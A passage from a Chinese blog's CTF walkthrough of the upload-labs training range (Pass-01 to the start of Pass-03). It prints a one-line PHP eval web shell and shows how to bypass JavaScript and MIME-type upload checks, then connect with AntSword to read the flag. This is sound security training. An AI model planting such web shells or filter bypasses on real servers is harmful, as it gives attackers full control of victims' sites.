<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>upload-labs-完整训练 | h-t-m</title><meta name="keywords" content="BUUCTF,网络安全,文件上传"><meta name="author" content="h-t-m"><meta name="copyright" content="h-t-m"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="再开篇文章把 upload-labs 所有的关卡都刷完！！"><meta property="og:type" content="article"><meta property="og:title" content="upload-labs-完整训练"><meta property="og:url" content="https://h-t-m.top/posts/ddd5444f/"><meta property="og:site_name" content="h-t-m"><meta property="og:description" content="再开篇文章把 upload-labs 所有的关卡都刷完！！"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://pic.h-t-m.ltd/img/upload-labs.webp"><meta property="article:published_time" content="2022-05-04T14:02:10.000Z"><meta property="article:modified_time" content="2022-05-16T04:10:51.640Z"><meta property="article:author" content="h-t-m"><meta property="article:tag" content="BUUCTF"><meta property="article:tag" content="网络安全"><meta property="article:tag" content="文件上传"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://pic.h-t-m.ltd/img/upload-labs.webp"><link rel="shortcut icon" href="/images/~logo.gif"><link rel="canonical" href="https://h-t-m.top/posts/ddd5444f/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//s4.cnzz.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="manifest" href="/manifest.json"><meta name="msapplication-TileColor" content="#E4E2D6"><link rel="apple-touch-icon" sizes="180x180" href="/images/siteicon/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/siteicon/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/siteicon/favicon-16x16.png"><link rel="mask-icon" href="/images/siteicon/safari-pinned-tab.svg" color="#5bbad5"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?2b93c7896a6f4dc63301e461b14f5b59";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-214297516-1"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-214297516-1")</script><script async data-pjax="data-pjax" src="https://s4.cnzz.com/z_stat.php?id=1280663206&amp;web_id=1280663206"></script><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"找不到您查询的内容：${query}"}},translate:void 0,noticeOutdate:void 0,highlight:{plugin:"highlighjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:{limitCount:50,languages:{author:"作者: h-t-m",link:"链接: ",source:"来源: h-t-m",info:"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},lightbox:"fancybox",Snackbar:{chs_to_cht:"你已切换为繁体",cht_to_chs:"你已切换为简体",day_to_night:"你已切换为深色模式",night_to_day:"你已切换为浅色模式",bgLight:"#49b1f5",bgDark:"#121212",position:"bottom-left"},source:{jQuery:"https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js",justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js",css:"https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css"},fancybox:{js:"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js",css:"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"}},isPhotoFigcaption:!0,islazyload:!1,isanchor:!0}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"upload-labs-完整训练",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2022-05-16 12:10:51"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)}),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const t=saveToLocal.get("theme"),o=(new Date).getHours();void 0===t?o<=6||o>=18?activateDarkMode():activateLightMode():"light"===t?activateLightMode():activateDarkMode();const n=saveToLocal.get("aside-status");void 0!==n&&("hide"===n?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));const a=saveToLocal.get("global-font-size");void 0!==a&&document.documentElement.style.setProperty("--global-font-size",a+"px");const c=()=>{GLOBAL_CONFIG_SITE.isHome&&/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")};c(),document.addEventListener("pjax:complete",c)})(window)</script><link rel="stylesheet" href="/css/copyright.css"><link rel="stylesheet" href="/css/custom.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.16/lib/tag_plugins.css" media="defer" onload='this.media="all"'><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><meta name="generator" content="Hexo 6.0.0"></head><body><a href="javascript:void(0);" onclick="preloader.endLoading()" title="点击跳过动画"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><img class="load-image" src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif" alt=""></div></a><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/logo.jpg" onerror='onerror=null,src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif"' alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">58</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-campground"></i> <span>所有文章</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i> <span>珍藏</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i> <span>相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i> <span>电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-flag"></i> <span>社交</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>链接</span></a></li><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-inbox"></i> <span>留言板</span></a></li><li><a class="site-page child" href="/bb/"><i class="fa-fw fas fa-fish"></i> <span>说说</span></a></li><li><a class="site-page child" href="/fcircle/"><i class="fa-fw fas fa-fan"></i> <span>朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i> <span>关于</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/me/"><i class="fa-fw fas fa-skiing"></i> <span>我</span></a></li><li><a class="site-page child" href="/her/"><i class="fa-fw fas fa-kiss-wink-heart"></i> <span>她</span></a></li><li><a class="site-page child" href="/we/"><i class="fa-fw fas fa-award"></i> <span>我们</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(https://pic.h-t-m.ltd/img/BUUCTF-top.webp)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h-t-m</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-campground"></i> <span>所有文章</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i> <span>珍藏</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i> <span>相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i> <span>电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-flag"></i> <span>社交</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>链接</span></a></li><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-inbox"></i> <span>留言板</span></a></li><li><a class="site-page child" href="/bb/"><i class="fa-fw fas fa-fish"></i> <span>说说</span></a></li><li><a class="site-page child" href="/fcircle/"><i class="fa-fw fas fa-fan"></i> <span>朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i> <span>关于</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/me/"><i class="fa-fw fas fa-skiing"></i> <span>我</span></a></li><li><a class="site-page child" href="/her/"><i class="fa-fw fas fa-kiss-wink-heart"></i> <span>她</span></a></li><li><a class="site-page child" href="/we/"><i class="fa-fw fas fa-award"></i> <span>我们</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">upload-labs-完整训练</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-05-04T14:02:10.000Z" title="发表于 2022-05-04 22:02:10">2022-05-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-05-16T04:10:51.640Z" title="更新于 2022-05-16 12:10:51">2022-05-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">11.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>39分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="upload-labs-完整训练"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>upload-labs-完整训练</h1><blockquote><p><strong>前言</strong></p><p>之前在 <a target="_blank" rel="noopener" href="https://buuoj.cn/">BUUCTF</a> 刷题时有幸看到这个靶场项目，感觉非常不错，因此特地开篇博文记录完整的刷题过程，目前共计21关。最近开的坑有点多，不过，既然开了那就一定会完成的🎉！第一关在此前的 <a href="https://h-t-m.top/posts/3989fe45/">BUUCTF 刷题笔记——day 5</a> 中已经完成，为保证完整性，本文也同步记录第一关。其中 Pass-01~04、Pass-06~07、Pass-19 靶机部署于 Linux 系统，Pass-5、Pass-12~14 靶机部署于本地，其余均部署于 Windows 系统。</p><p>由于图片数量非常可观，因此本文中出现的图片全部存储于 <a target="_blank" rel="noopener" href="https://7bu.top/">去不图床</a> ，若失效或遇到其他问题请及时联系本人。</p><p>特别感谢靶机作者<a target="_blank" rel="noopener" href="https://github.com/c0ny1">c0ny1</a></p></blockquote><h2 id="Pass-01">Pass-01</h2><h3 id="启动靶机-8">启动靶机</h3><ul><li><p>打开网页，页面还是挺好看的，虽然这并不重要。</p><img src="https://bu.dusays.com/2022/05/11/627bdb291eba0.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-2">研究页面</h3><ul><li><p>既然有上传图片的功能，那就上传一张看看。</p><img src="https://bu.dusays.com/2022/05/09/6278b01318dc0.webp" alt="" style="zoom:75%"></li><li><p>一切正常，根据图片 url 可以看出文件被上传至网页目录的 <code>upload</code> 目录下。</p><img src="https://bu.dusays.com/2022/05/09/6278b014a5ce5.webp" alt="" style="zoom:75%"></li><li><p>再上传一个其他文件看看，被阻止了，说是只支持 <code>jpg/png/gif</code> 三种文件，老实说不支持 <code>webp</code> 我不是很认可。</p><img src="https://bu.dusays.com/2022/05/09/6278b01603cf6.webp" alt="" style="zoom:75%"></li><li><p>也就是说，我们只能上传这三种文件，想通过上传我们的木马武装夺旗，就只能想办法突破这种限制。作为小白，理所应当地查看提示：</p><img src="https://bu.dusays.com/2022/05/09/6278b01702eed.webp" alt="" style="zoom:75%"></li><li><p>使用 js 检查可还行，意味着检查在前端完成，而前端完全可以由我们自行操作！</p></li></ul><h3 id="突破限制-2">突破限制</h3><ul><li><p>这里可以先创建好一个文件，先编写好所谓的“一句话木马”。</p><blockquote><p><strong>一句话木马</strong></p><p>将仅含一行代码的程序文件上传至目标网站，如 PHP 代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;h-t-m&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>@</code> 表示其后代码即使出错也将不会报错。</li><li><code>eval()</code> 函数表示将参数当作代码来执行。</li><li><code>$_POST[]</code> 表示以 post 方式获取变量。</li></ul><p>也就是说，我们将文件上传之后，即可用对应方法向网站提交代码并执行，这里使用 post 方法。虽然我们直接定义了自己的变量名 <code>h-t-m</code> ，但是 <code>@</code> 可以保证不会报错。于是我们完全可以通过这个文件直接连接至服务器。</p></blockquote></li><li><p>由于只是 js 检查，为表示对检查的尊重，我们大可以嚣张一点，将文件名命名为 <code>木马.php</code> 。</p><img src="https://bu.dusays.com/2022/05/09/6278b01801170.webp" alt="" style="zoom:75%"></li><li><p>突破前端检查，可以直接修改对应的 js 代码，也可以直接在浏览器禁用 JavaScript ，或者直接删除 HTML 中对检查代码的调用。</p><p><strong>以下三种方法任选其一即可</strong></p><ul><li><p>修改 js 代码需要在控制台重构函数，直接原地修改无效。查看语句找到该检查函数如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，文件类型的限定语句为 <code>var allow_ext = &quot;.jpg|.png|.gif&quot;;</code> 那么只要将我们要上传的文件的后缀名加入，并在控制台中执行即可：</p><img src="https://bu.dusays.com/2022/05/09/6278b01b256d8.webp" alt="" style="zoom:75%"></li><li><p>禁用 JavaScript ：右键——检查——设置——禁用即可</p><img src="https://bu.dusays.com/2022/05/09/6278b02bc19fe.webp" alt="" style="zoom:75%"></li><li><p>删除 HTML 中代码即删除如图语句即可</p><img src="https://bu.dusays.com/2022/05/09/6278b018e3961.webp" alt="" style="zoom:75%"></li></ul></li><li><p>解除限制之后，便可以将文件上传了</p><img src="https://bu.dusays.com/2022/05/09/6278b01c13623.webp" alt="" style="zoom:75%"></li><li><p>刚开始对页面研究时我们得知，文件是直接上传至网页所在目录的 <code>upload</code> 目录下的，因此可以得知我们上传的文件的 URL 为 <code>http://靶机地址/upload/木马.php</code> ，当然也可以在上传页直接查看文件地址。值得注意的是，URL 中不应包含中文字符，这里取的这个名字显然是不能直接这么用了，改名是不可能改名的，因此这里需要编码一下 <code>http://[靶机地址]/upload/%E6%9C%A8%E9%A9%AC.php</code> 。</p></li></ul><h3 id="入侵-2">入侵</h3><ul><li><p>上传好木马后，就该使用工具进入整个后台服务器了。中国蚁剑既可以完成这个任务，配置安装入门可参考官方 <a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword/blob/master/README_CN.md">中文文档</a> 。打开软件添加连接：</p><img src="https://bu.dusays.com/2022/05/09/6278b01f31e6a.webp" alt="" style="zoom:75%"></li><li><p>注意到，这里需要输入密码，那么密码是什么呢？在前面输入的一句话代码中， <code>&lt;?php @eval($_POST[&quot;h-t-m&quot;]);?&gt;</code> ，我们将通过 post 方法将内容传输至 <code>h-t-m</code> 变量中而实现入侵，而这个变量就是进入服务器所需要的连接密码。因此，输入变量名即可。</p><img src="https://bu.dusays.com/2022/05/09/6278b0219b431.webp" alt="" style="zoom:75%"></li><li><p>添加成功后双击连接即可进入木马文件所在目录，右边同样可以看到目录列表，因此现在我们已经拥有了网站所有的文件了，并且可以进行任意增删改查！</p><img src="https://bu.dusays.com/2022/05/09/6278b0227f79a.webp" alt="" style="zoom:75%"></li></ul><h3 id="寻找-flag-2">寻找 flag</h3><ul><li><p>既然已经获得所有权了，那就可以慢慢找了。不过，目前的经验表明，flag 一般会放在根目录，因此首先查看根目录，果不其然：</p><img src="https://bu.dusays.com/2022/05/09/6278b0280afb4.webp" alt="" style="zoom:75%"></li><li><p>都到这一步了，就双击打开吧！</p><img src="https://bu.dusays.com/2022/05/09/6278b02924fa4.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-02">Pass-02</h2><h3 id="启动靶机-9">启动靶机</h3><ul><li><p>第二关的界面没有任何变化。</p><img src="https://bu.dusays.com/2022/05/09/6278b00fcb452.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-3">研究页面</h3><ul><li><p>上传一个图片文件，可以正常上传，且依然上传在了网站目录的 <code>upload</code> 目录下。</p><img src="https://bu.dusays.com/2022/05/09/6278b01097a5d.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/09/6278b019b7879.webp" alt="" style="zoom:75%"></li><li><p>再上传一个其他文件，无法正常上传，且提示错误信息与上次不同。</p><img src="https://bu.dusays.com/2022/05/09/6278b01d2c157.webp" alt="" style="zoom:75%"></li><li><p>小白表示线索不够，依然选择看提示，提示显示：<code>本pass在服务端对数据包的 MIME 进行检查！X2</code> 。虽然不知道为啥要显示两遍，但显然这很重要！</p><img src="https://bu.dusays.com/2022/05/09/6278b01e4a703.webp" alt="" style="zoom:75%"><blockquote><p><strong>注</strong>：由于在提示加载出来之前我快速点击了两遍，因此才会显示两遍。</p></blockquote></li><li><p>所以，什么是 <code>MIME</code> ？</p><blockquote><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p><div align="right">——百度百科</div></blockquote><p>显然这个解释帮助不是很大，但是我们有必要知道的就是，<code>MIME</code> 信息头中有以下几个重要字段：</p><ol><li><code>MIME-Version</code>: 提供所用的 <code>MIME</code> 版本号。</li><li><code>Content-Type</code>: 表示数据类型。</li><li><code>Content-Transfer-Encoding</code>: 表示对数据执行的编码方式。</li></ol><p>如果要对数据包的 <code>MIME</code> 进行检查，那么显然当我们上传木马文件的时候就没办法通过服务器对 <code>Content-Type</code> 的限制了。</p></li><li><p>既然如此，我们就可以查看一下源码：</p><img src="https://bu.dusays.com/2022/05/09/6278b020845f5.webp" alt="" style="zoom:75%"><p>里面最关键的就是 <code>if</code> 判断语句中的内容，他决定我们能否上传：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)</span><br></pre></td></tr></table></figure><p>不难看出，该判断语句将 <code>MIME</code> 信息头的 <code>Content-Type</code> 字段限制在了 <code>image/jpeg</code> 、 <code>image/png</code> 、 <code>image/gif</code> 三种类型中。</p></li><li><p>由于判断发生在服务端，因此继续修改前端代码就有点自欺欺人了。为了让我们的木马文件继续符合条件，我们有必要抓包了！</p></li></ul><h3 id="突破限制-3">突破限制</h3><ul><li><p>首先依然先准备好一句话木马文件，与第一关一样。</p></li><li><p>打开 <code>BurpSuitePro</code> 并在内部浏览器打开网页，准备抓包：</p><img src="https://bu.dusays.com/2022/05/09/6278b0240c050.webp" alt="" style="zoom:75%"></li><li><p>将我们的木马文件上传，可以看到抓包的内容，其中就有我们所关注的 <code>Content-Type</code> 字段：</p><img src="https://bu.dusays.com/2022/05/09/6278b0263fc57.webp" alt="" style="zoom:75%"><p>直接修改这个字段，让我们的字段符合条件然后点击 <code>Forward</code> 即可：</p><img src="https://bu.dusays.com/2022/05/09/6278b02a61c74.webp" alt="" style="zoom:75%"></li><li><p>返回网页即可看到，我们的文件已经成功上传了！</p><img src="https://bu.dusays.com/2022/05/09/6278b02ca8766.webp" alt="" style="zoom:75%"></li><li><p>一开始上传图片的时候我们便知道，文件依然存储于网站目录的 <code>upload</code> 目录下，因此木马文件所在的 URL 还是：<code>http://靶机地址/upload/木马.php</code> ，当然，编码后为 <code>http://[靶机地址]/upload/%E6%9C%A8%E9%A9%AC.php</code> 。也可以右键新标签页打开文件，地址栏直接复制地址，后面都推荐使用这种方式！</p></li></ul><h3 id="夺旗">夺旗</h3><ul><li><p>上传成功那剩下就还是老样子了，先在中国蚁剑中添加链接：</p><img src="https://bu.dusays.com/2022/05/09/6278b02d7e507.webp" alt="" style="zoom:75%"></li><li><p>然后进入网站目录列表：</p><img src="https://bu.dusays.com/2022/05/09/6278b02e60195.webp" alt="" style="zoom:75%"></li><li><p>根据前面的经验，直接访问根目录，打开 <code>flag</code> ，夺旗成功！</p><img src="https://bu.dusays.com/2022/05/09/6278b02f3de14.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-03">Pass-03</h2><h3 id="启动靶机-10">启动靶机</h3><ul><li><p>熟悉的界面一点没变</p><img src="https://bu.dusays.com/2022/05/09/6278b030453b4.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面">研究界面</h3><ul><li><p>显然上传目录是不会改变的，因此不再检测图片，直接传木马！</p><img src="https://bu.dusays.com/2022/05/09/6278b0310f62a.webp" alt="" style="zoom:75%"><p>那当然是没这么简单的，果不其然返回了错误信息，但是第三关的错误信息跟第二关就不太一样了。之前是只让传图片，现在是直接给可能的木马文件拉了黑名单。</p></li><li><p>错误信息表明应该只限制了 <code>.asp</code>、<code>.aspx</code>、<code>.php</code>、<code>.jsp</code> 这四种文件后缀名而已，如果是这样的话，我们只要修改后缀名即可上传成功。查看源代码确认：</p><img src="https://bu.dusays.com/2022/05/09/6278b0328d240.webp" alt="" style="zoom:75%"><p>由这两句可以看出，确实是仅仅限制了这四种后缀名而已。</p></li><li><p>可以注意源代码中有这么一行代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure><p>这意味着不仅这四种后缀名，还包括他们的大小写形式都被屏蔽了，即形如 <code>.PhP</code> 、 <code>.pHP</code> 、 <code>.PHP</code> 等。</p></li></ul><h3 id="突破限制-4">突破限制</h3><ul><li><p>那么，后缀名如何修改才能不影响木马文件的使用呢？</p><blockquote><p>在 <code>php5 module for apache2(libapache2-mod-php5)</code> 中默认允许将多个扩展作为 <code>php</code> 脚本执行（兼容性考量）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#/etc/apache2/mods-enabled/php5.conf</span><br><span class="line">&lt;FilesMatch &quot;.+\.ph(p[345]?|t|tml)$&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;FilesMatch &quot;.+\.phps$&quot;&gt;</span><br><span class="line">    